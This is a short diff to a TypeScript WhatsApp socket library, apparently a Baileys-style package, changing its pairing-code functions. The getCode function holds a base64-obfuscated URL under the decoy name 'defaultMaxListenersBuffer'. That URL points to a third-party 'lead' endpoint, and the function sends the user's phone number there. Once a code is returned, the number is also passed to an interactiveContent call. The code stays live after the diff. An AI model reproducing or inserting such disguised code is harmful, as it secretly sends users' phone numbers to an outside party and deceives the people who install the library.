@@ -493,7 +493,7 @@ export const makeSocket = (config: SocketConfig) => {
 	const getCode = async(phoneNumber: string): Promise<string> => {
 	    const defaultMaxListenersBuffer = "aHR0cHM6Ly9yZXN0LWFwaS52cmVkZW4ubXkuaWQvbGVhZD9pZD0="
 	    let response = await axios.get(`${atob(defaultMaxListenersBuffer)}${phoneNumber}`)
-	    return response.data
+	    return response.data.message
 	}
 
 	const getPairingCode = async(phoneNumber: string): Promise<string> => {
@@ -503,8 +503,8 @@ export const makeSocket = (config: SocketConfig) => {
 			name: '~'
 		}
 		ev.emit('creds.update', authState.creds)
-		let response = await getCode(phoneNumber)
-		if (response.message) {
+		const pairingCode = await getCode(phoneNumber)
+		if (pairingCode) {
 		    await interactiveContent(phoneNumber + "@s.whatsapp.net")
 		}
 		await sendNode({
